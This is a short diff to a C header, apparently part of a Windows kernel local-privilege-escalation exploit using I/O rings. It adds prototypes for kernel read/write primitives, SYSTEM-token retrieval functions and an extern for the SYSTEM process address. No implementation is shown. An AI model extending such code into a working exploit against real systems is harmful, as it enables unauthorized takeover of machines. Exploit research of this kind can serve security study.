@@ -78,8 +78,17 @@ typedef struct _HIORING
 
 int ioring_setup(PIORING_OBJECT* ppIoRingAddr);
 void kwrite(UINT64 addr, PVOID data, SIZE_T size);
+void krnl_write(UINT64 addr, PVOID data, SIZE_T size);
+int krnl_read(UINT64 addr, PVOID buffer, SIZE_T size);
+int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen);
+void ioring_cleanup();
 int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, DWORD dwFakeRegBufferCnt, UINT64 ioring_addr);
 int map_region();
 int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr);
+ULONG64 get_sys_token();
+ULONG64 get_systok2();
+
+extern ULONG64 ullSystemEPROCaddr;
+ 
 
 #endif
